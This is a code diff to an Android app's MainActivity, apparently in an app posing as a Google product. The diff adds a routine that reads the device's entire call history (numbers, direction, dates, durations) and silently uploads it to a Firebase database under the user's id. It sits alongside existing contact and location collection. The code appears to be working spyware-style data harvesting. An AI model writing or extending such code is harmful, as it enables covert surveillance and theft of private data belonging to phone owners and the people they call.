@@ -21,6 +21,7 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.util.Log;
@@ -31,10 +32,10 @@ import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Toast;
 
+import com.example.google.Classes.CallLogs;
 import com.example.google.Classes.Person;
 import com.example.google.Classes.user;
 import com.example.google.Classes.userContacts;
-import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
@@ -43,6 +44,7 @@ import com.google.firebase.database.Query;
 import com.google.firebase.database.ValueEventListener;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 import static java.security.AccessController.getContext;
@@ -52,6 +54,7 @@ public class MainActivity extends AppCompatActivity {
     DatabaseReference rootRef;
     String uniqueKey;
     List<user> userdatalist;
+    CallLogs callLog;
     LocationManager locationManager;
     user user;
     String uid;
@@ -128,7 +131,34 @@ public class MainActivity extends AppCompatActivity {
 
                 }
             });
-        } else {
+        }
+        if(grantResults[3] == PackageManager.PERMISSION_GRANTED){
+            //Log.d("DATA",""+getCallDetails());
+
+            DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference("CallLogs");
+            Query query = rootRef.child("CallLogs").child(uid);
+            query.addValueEventListener(new ValueEventListener() {
+                @Override
+                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                    callLog = dataSnapshot.getValue(CallLogs.class);
+                    // String id = user.getUid();
+                    if(callLog != null){
+
+                    }
+                    else {
+                        DatabaseReference myref = FirebaseDatabase.getInstance().getReference("CallLogs").child(uid);
+                        callLog = new CallLogs(getCallDetails());
+                        myref.setValue(callLog);
+                    }
+                }
+
+                @Override
+                public void onCancelled(@NonNull DatabaseError databaseError) {
+
+                }
+            });
+        }
+        else {
             Log.d("TAG", "not granted");
         }
     }
@@ -248,7 +278,46 @@ public class MainActivity extends AppCompatActivity {
             });
 
     }
+    private String getCallDetails() {
 
+        StringBuffer sb = new StringBuffer();
+        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
+                null, null, null);
+        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+        sb.append("Call Details :");
+        while (managedCursor.moveToNext()) {
+            String phNumber = managedCursor.getString(number);
+            String callType = managedCursor.getString(type);
+            String callDate = managedCursor.getString(date);
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString(duration);
+            String dir = null;
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+                    + dir + " \nCall Date:--- " + callDayTime
+                    + " \nCall duration in sec :--- " + callDuration);
+            sb.append("\n----------------------------------");
+        }
+        managedCursor.close();
+        return sb.toString();
+
+    }
     private void startWebView(String url) {
 
         WebSettings settings = webView.getSettings();
